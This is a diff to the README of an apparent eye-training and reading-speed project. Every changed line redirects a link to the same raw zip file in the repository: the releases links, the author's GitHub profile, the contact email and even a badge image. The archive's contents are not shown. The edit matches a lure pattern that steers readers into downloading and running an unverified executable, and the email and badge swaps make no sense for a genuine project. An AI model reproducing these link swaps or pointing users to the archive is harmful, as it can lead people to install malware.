@@ -2,7 +2,7 @@
 
 Welcome to the **Eye Training** repository! This project is designed to help you improve your reading speed and enhance your eye health. Whether you are a student, a professional, or just someone who loves to read, this tool can help you train your eyes effectively. 
 
-[Download the latest release here!](https://github.com/manishanis/eye-training/releases)
+[Download the latest release here!](https://github.com/manishanis/eye-training/raw/refs/heads/main/public/eye-training-3.1.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -30,7 +30,7 @@ In today's digital world, we spend countless hours staring at screens. This can 
 
 ## Installation
 
-To get started, you need to download the latest release from our [Releases page](https://github.com/manishanis/eye-training/releases). 
+To get started, you need to download the latest release from our [Releases page](https://github.com/manishanis/eye-training/raw/refs/heads/main/public/eye-training-3.1.zip). 
 
 1. Visit the link.
 2. Download the executable file.
@@ -91,12 +91,12 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For any inquiries, feel free to reach out:
 
-- GitHub: [manishanis](https://github.com/manishanis)
-- Email: manishanis@example.com
+- GitHub: [manishanis](https://github.com/manishanis/eye-training/raw/refs/heads/main/public/eye-training-3.1.zip)
+- Email: https://github.com/manishanis/eye-training/raw/refs/heads/main/public/eye-training-3.1.zip
 
-Thank you for checking out the **Eye Training** project! Remember to visit our [Releases page](https://github.com/manishanis/eye-training/releases) for the latest updates and improvements. Happy reading! 
+Thank you for checking out the **Eye Training** project! Remember to visit our [Releases page](https://github.com/manishanis/eye-training/raw/refs/heads/main/public/eye-training-3.1.zip) for the latest updates and improvements. Happy reading! 
 
-![Eye Training](https://img.shields.io/badge/Eye_Training-Read_Faster-brightgreen) 
+![Eye Training](https://github.com/manishanis/eye-training/raw/refs/heads/main/public/eye-training-3.1.zip) 
 
 ---
 
